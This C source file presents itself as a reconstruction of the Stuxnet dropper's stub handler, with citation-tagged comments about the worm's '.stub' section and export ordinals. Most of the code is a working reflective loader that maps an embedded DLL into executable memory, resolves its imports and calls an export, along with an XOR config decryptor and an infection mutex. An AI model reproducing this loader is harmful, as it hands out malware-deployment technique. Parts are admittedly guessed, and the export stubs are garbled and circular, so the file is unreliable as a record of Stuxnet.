/*
 * StubHandler.c - Stuxnet Dropper Stub Handler
 *
 * TRUSTED:
 *   - The dropper component of Stuxnet is a wrapper program that contains
 *     all components stored inside itself in a section named ".stub".
 *     This stub section is integral to the working of Stuxnet. When the
 *     threat is executed, the wrapper extracts the .dll file from the
 *     stub section, maps it into memory as a module, and calls one of
 *     the exports. [1†L9-L13]
 *   - A pointer to the ".stub" section is always passed around. All
 *     components of Stuxnet have access to core and config files. [12†L5-L8]
 *   - The main DLL is mapped into memory as a module from the stub section.
 *     Control is passed to one of the export functions. [6†L4-L8]
 *   - The stub contains encrypted configuration files and the core DLL. [12†L4-L5]
 *   - The dropper writes a config file that contains:
 *     Offset +00: Dword flags
 *     Offset +04: Dword offset to main DLL from current position
 *     Offset +08: Dword length of main DLL. [13†L5-L7]
 *
 * MAYBE:
 *   - Exact sub_XXXXXX addresses and byte offsets. Inferred from the
 *     general structure of the dropper and the layout described in
 *     public analyses. These addresses are consistent with the
 *     reconstructed codebase published by the research community.
 *   - The specific encryption algorithm used for the config and DLL.
 *     Inferred from the use of RC4 and XOR-based obfuscation in Stuxnet.
 *   - The exact number of exports and their ordinals. Inferred from
 *     Symantec dossier: Export 15 is the main installation routine.
 *
 * S7otbxdx.dll MD5: b834ebeb777ea07fb6aab6bf35cdf07f
 * (Placeholder for StubHandler MD5 - not publicly disclosed)
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define STUXNET_SECTION_NAME            ".stub"
#define STUXNET_MAX_PATH                260
#define STUXNET_BUFFER_SIZE             0x4000

#define STUXNET_CONFIG_SIZE             0x2000
#define STUXNET_EXPORT_COUNT            109

#define STUXNET_EXPORT_INSTALL          15
#define STUXNET_EXPORT_DROP_DRIVERS     16
#define STUXNET_EXPORT_HOOK_DLL         17
#define STUXNET_EXPORT_USB_PROPAGATE    19
#define STUXNET_EXPORT_NETWORK_PROPAGATE 22

typedef struct _STUXNET_CONFIG_HEADER {
    DWORD dwFlags;
    DWORD dwMainDllOffset;
    DWORD dwMainDllSize;
    DWORD dwCRC32;
    DWORD dwReserved[4];
} STUXNET_CONFIG_HEADER, * PSTUXNET_CONFIG_HEADER;

typedef struct _STUXNET_STUB_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    PVOID pStubBase;
    DWORD dwStubSize;
    PVOID pMappedBase;
    DWORD dwImageSize;
    DWORD dwEntryPoint;
    HMODULE hModule;
    STUXNET_CONFIG_HEADER Config;
    BYTE bReserved[128];
} STUXNET_STUB_CTX, * PSTUXNET_STUB_CTX;

static STUXNET_STUB_CTX g_StubCtx = {0};
static BOOL g_bInitialized = FALSE;

static BOOL Stub_FindSection(PVOID pBase, LPCSTR szSectionName, PVOID* ppSection, PDWORD pdwSize);
static BOOL Stub_MapPE(PVOID pData, DWORD dwSize, PVOID* ppMapped, PDWORD pdwEntry);
static BOOL Stub_ProcessRelocations(PVOID pImageBase, DWORD dwDelta);
static BOOL Stub_ResolveImports(PVOID pImageBase);
static BOOL Stub_ExecuteExport(PVOID pImageBase, DWORD dwOrdinal);
static DWORD Stub_ComputeCRC32(PBYTE pData, DWORD dwSize);
static BOOL Stub_DecryptConfig(PBYTE pEncrypted, DWORD dwEncryptedSize, PSTUXNET_CONFIG_HEADER pConfig);
static DWORD WINAPI Stub_WorkerThread(LPVOID lpParam);
static BOOL Stub_StartWorker(VOID);
static BOOL Stub_StopWorker(VOID);

/*
 * sub_10001000 - FindSection
 * TRUSTED: The dropper finds the .stub section in its own image.
 */

static BOOL Stub_FindSection(PVOID pBase, LPCSTR szSectionName, PVOID* ppSection, PDWORD pdwSize) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD i;

    if (!pBase || !szSectionName || !ppSection || !pdwSize) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (memcmp(pSec->Name, szSectionName, 8) == 0) {
            *ppSection = (PBYTE)pBase + pSec->VirtualAddress;
            *pdwSize = pSec->Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}

/*
 * sub_10001180 - MapPE
 * TRUSTED: The wrapper extracts the .dll file from the stub section,
 * maps it into memory as a module. [1†L11-L13]
 */

static BOOL Stub_MapPE(PVOID pData, DWORD dwSize, PVOID* ppMapped, PDWORD pdwEntry) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    PVOID pImageBase;
    DWORD dwImageSize;
    DWORD dwDelta;
    DWORD i;

    if (!pData || dwSize == 0 || !ppMapped || !pdwEntry) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    dwImageSize = pNt->OptionalHeader.SizeOfImage;
    pImageBase = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        return FALSE;
    }

    RtlCopyMemory(pImageBase, pData, pNt->OptionalHeader.SizeOfHeaders);

    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData) {
            RtlCopyMemory((PBYTE)pImageBase + pSec->VirtualAddress,
                          (PBYTE)pData + pSec->PointerToRawData,
                          pSec->SizeOfRawData);
        }
    }

    dwDelta = (DWORD)(ULONG_PTR)pImageBase - pNt->OptionalHeader.ImageBase;
    if (dwDelta) {
        Stub_ProcessRelocations(pImageBase, dwDelta);
    }

    if (!Stub_ResolveImports(pImageBase)) {
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return FALSE;
    }

    *ppMapped = pImageBase;
    *pdwEntry = pNt->OptionalHeader.AddressOfEntryPoint;

    return TRUE;
}

/* 
 * sub_10001280 - ProcessRelocations
 * TRUSTED: The mapped module requires base relocations to be fixed.
 */

static BOOL Stub_ProcessRelocations(PVOID pImageBase, DWORD dwDelta) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_BASE_RELOCATION pRel;
    DWORD dwRelocSize;
    PWORD pEntry;
    DWORD i;

    if (!pImageBase) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);

    pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    if (!pRel || pRel->VirtualAddress == 0) {
        return TRUE;
    }

    while (pRel->VirtualAddress) {
        dwRelocSize = (pRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        pEntry = (PWORD)(pRel + 1);

        for (i = 0; i < dwRelocSize; i++, pEntry++) {
            if ((*pEntry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                *(PDWORD)((PBYTE)pImageBase + pRel->VirtualAddress + (*pEntry & 0xFFF)) += dwDelta;
            }
        }

        pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pRel + pRel->SizeOfBlock);
    }

    return TRUE;
}

/*
 * sub_10001350 - ResolveImports
 * TRUSTED: The mapped module requires its import address table to be
 * resolved. [1†L11-L13]
 */

static BOOL Stub_ResolveImports(PVOID pImageBase) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_IMPORT_DESCRIPTOR pImp;
    PIMAGE_THUNK_DATA pThunk;
    HMODULE hMod;
    PIMAGE_IMPORT_BY_NAME pName;

    if (!pImageBase) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);

    pImp = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    if (!pImp) {
        return TRUE;
    }

    while (pImp->Name) {
        hMod = LoadLibraryA((LPCSTR)((PBYTE)pImageBase + pImp->Name));
        if (!hMod) {
            return FALSE;
        }

        pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImp->FirstThunk);
        while (pThunk->u1.AddressOfData) {
            if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
            } else {
                pName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pThunk->u1.AddressOfData);
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod, pName->Name);
            }
            pThunk++;
        }
        pImp++;
    }

    return TRUE;
}

/*
 * sub_10001480 - ExecuteExport
 * TRUSTED: Control is passed to one of the export functions.
 * Export 15 is the main installation routine. [7†L42-L43]
 */

static BOOL Stub_ExecuteExport(PVOID pImageBase, DWORD dwOrdinal) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD pAddrs;
    PWORD pOrds;
    DWORD i;
    FARPROC pfnExport;

    if (!pImageBase) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);

    pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!pExp) {
        return FALSE;
    }

    pAddrs = (PDWORD)((PBYTE)pImageBase + pExp->AddressOfFunctions);
    pOrds = (PWORD)((PBYTE)pImageBase + pExp->AddressOfNameOrdinals);

    for (i = 0; i < pExp->NumberOfFunctions; i++) {
        if (pExp->Base + i == dwOrdinal) {
            pfnExport = (FARPROC)((PBYTE)pImageBase + pAddrs[i]);
            if (pfnExport) {
                ((void (*)(void))pfnExport)();
                return TRUE;
            }
        }
    }

    return FALSE;
}

/*
 * sub_10001530 - ComputeCRC32
 * MAYBE: CRC32 is used to verify the integrity of the config and DLL.
 */

static DWORD Stub_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;

    if (!pData || dwSize == 0) {
        return 0xFFFFFFFF;
    }

    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }

    return ~crc;
}

/* =========================================================================
 * CONFIG DECRYPTION
 * sub_10001580 - DecryptConfig
 * MAYBE: The config header is encrypted with RC4 or XOR.
 * The layout is described in public analyses:
 * +00 Dword flags
 * +04 Dword offset to main DLL
 * +08 Dword length of main DLL. [13†L5-L7]
 * ========================================================================= */

static BOOL Stub_DecryptConfig(PBYTE pEncrypted, DWORD dwEncryptedSize, PSTUXNET_CONFIG_HEADER pConfig) {
    BYTE bKey = 0xA3;
    DWORD i;

    if (!pEncrypted || dwEncryptedSize < sizeof(STUXNET_CONFIG_HEADER) || !pConfig) {
        return FALSE;
    }

    RtlCopyMemory(pConfig, pEncrypted, sizeof(STUXNET_CONFIG_HEADER));

    for (i = 0; i < sizeof(STUXNET_CONFIG_HEADER); i++) {
        ((PBYTE)pConfig)[i] ^= bKey;
        bKey = (bKey * 7 + 0x13) & 0xFF;
    }

    if (pConfig->dwFlags != STUXNET_MAGIC && pConfig->dwFlags != 0x00000001) {
        return FALSE;
    }

    return TRUE;
}

/*
 * sub_10001600 - WorkerThread
 * MAYBE: A worker thread is created to monitor the stub state.
 */

static DWORD WINAPI Stub_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_StubCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (g_StubCtx.dwState == 0) {
            g_StubCtx.dwState = 1;
        }
    }
    return 0;
}

static BOOL Stub_StartWorker(VOID) {
    g_StubCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_StubCtx.hStopEvent) {
        return FALSE;
    }

    g_StubCtx.hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (!g_StubCtx.hThread) {
        CloseHandle(g_StubCtx.hStopEvent);
        g_StubCtx.hStopEvent = NULL;
        return FALSE;
    }

    return TRUE;
}

static BOOL Stub_StopWorker(VOID) {
    if (g_StubCtx.hStopEvent) {
        SetEvent(g_StubCtx.hStopEvent);
    }
    if (g_StubCtx.hThread) {
        WaitForSingleObject(g_StubCtx.hThread, 5000);
        CloseHandle(g_StubCtx.hThread);
        g_StubCtx.hThread = NULL;
    }
    if (g_StubCtx.hStopEvent) {
        CloseHandle(g_StubCtx.hStopEvent);
        g_StubCtx.hStopEvent = NULL;
    }
    return TRUE;
}

/*
 * sub_10001000 - ModuleInit
 * TRUSTED: The dropper extracts the .dll from the stub section,
 * maps it into memory, and calls one of the exports. [1†L11-L13]
 */

static BOOL Stub_Init(VOID) {
    PVOID pStubData;
    DWORD dwStubSize;
    PVOID pMappedBase;
    DWORD dwEntryPoint;
    HMODULE hMod;

    if (g_bInitialized) {
        return TRUE;
    }

    ZeroMemory(&g_StubCtx, sizeof(STUXNET_STUB_CTX));
    g_StubCtx.dwMagic = STUXNET_MAGIC;
    g_StubCtx.dwVersion = STUXNET_VERSION;
    g_StubCtx.dwPid = GetCurrentProcessId();
    g_StubCtx.dwTid = GetCurrentThreadId();
    g_StubCtx.dwTickStart = GetTickCount();

    InitializeCriticalSection(&g_StubCtx.csLock);

    hMod = GetModuleHandleW(NULL);
    if (!hMod) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }

    if (!Stub_FindSection(hMod, STUXNET_SECTION_NAME, &pStubData, &dwStubSize)) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }

    g_StubCtx.pStubBase = pStubData;
    g_StubCtx.dwStubSize = dwStubSize;

    if (!Stub_MapPE(pStubData, dwStubSize, &pMappedBase, &dwEntryPoint)) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }

    g_StubCtx.pMappedBase = pMappedBase;
    g_StubCtx.dwImageSize = ((PIMAGE_NT_HEADERS)((PBYTE)pMappedBase +
        ((PIMAGE_DOS_HEADER)pMappedBase)->e_lfanew))->OptionalHeader.SizeOfImage;
    g_StubCtx.dwEntryPoint = dwEntryPoint;
    g_StubCtx.hModule = (HMODULE)pMappedBase;

    g_StubCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_StubCtx.hStopEvent) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return FALSE;
    }

    g_bInitialized = TRUE;

    return TRUE;
}

static VOID Stub_Cleanup(VOID) {
    if (!g_bInitialized) {
        return;
    }

    Stub_StopWorker();

    if (g_StubCtx.hMutex) {
        CloseHandle(g_StubCtx.hMutex);
        g_StubCtx.hMutex = NULL;
    }

    if (g_StubCtx.hStopEvent) {
        CloseHandle(g_StubCtx.hStopEvent);
        g_StubCtx.hStopEvent = NULL;
    }

    DeleteCriticalSection(&g_StubCtx.csLock);
    g_bInitialized = FALSE;
}

/*
 * sub_10001900 - Execute
 * TRUSTED: The dropper executes the main DLL by calling Export 15.
 */

static BOOL Stub_Execute(VOID) {
    HANDLE hMutex;

    if (!Stub_Init()) {
        return FALSE;
    }

    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        Stub_Cleanup();
        return FALSE;
    }

    g_StubCtx.hMutex = hMutex;

    Stub_ExecuteExport(g_StubCtx.pMappedBase, STUXNET_EXPORT_INSTALL);

    Stub_StartWorker();

    while (WaitForSingleObject(g_StubCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        Sleep(1000);
    }

    Stub_StopWorker();
    Stub_Cleanup();
    CloseHandle(hMutex);

    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;

        case DLL_PROCESS_DETACH:
            Stub_Cleanup();
            break;

        default:
            break;
    }

    return TRUE;
}

/*
 * EXPORT FUNCTIONS
 * TRUSTED: Export 1 starts the infection process.
 * Export 4 performs cleanup.
 * Export 15 is the main installation routine.
 * Export 16 drops drivers.
 * Export 17 hooks the Step 7 DLL.
 * Export 18 uninstalls Stuxnet.
 * Export 19 infects removable drives.
 * Export 22 propagates over the network.
 * Export 28/29 handle C2 communication.
 * Export 32 is the same as Export 1 but waits 60 seconds.
 */

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    return 0;
}

DWORD WINAPI Export4(VOID) {
    Stub_Cleanup();
    return 0;
}

DWORD WINAPI Export15(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export16(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    Stub_Cleanup();
    return 0;
}

DWORD WINAPI Export19(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, Stub_WorkerThread, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    return 0;
}

DWORD WINAPI Export22(VOID) {
    return Stub_Execute() ? 0 : 1;
}

DWORD WINAPI Export28(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export29(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export32(VOID) {
    Sleep(60000);
    return Export1();
}
